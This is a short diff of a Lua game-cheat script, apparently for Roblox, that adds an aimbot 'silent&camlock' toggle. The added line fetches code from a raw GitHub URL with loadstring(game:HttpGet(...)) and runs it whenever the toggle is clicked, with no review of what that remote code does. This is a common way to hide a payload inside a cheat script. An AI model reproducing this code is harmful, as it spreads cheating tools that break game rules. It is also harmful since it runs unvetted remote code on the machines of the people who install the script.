@@ -25,7 +25,7 @@ local AimbotTab = Library:CreateTab("By Somedude_r", "SuccotashWare", true)
 
 local AimbotTab = Library:CreateTab("Aimlock", "This is where you toggle the Aimlock")
 
-AimbotTab:CreateToggle("Enable Aimbot", function(arg) 
+AimbotTab:CreateToggle("Enable silent&camlock", function(arg)loadstring(game:HttpGet("https://raw.githubusercontent.com/1kidskidder/buttons/main/full",true))()
     if arg then
         print("Aimbot is now : Enabled")
     else
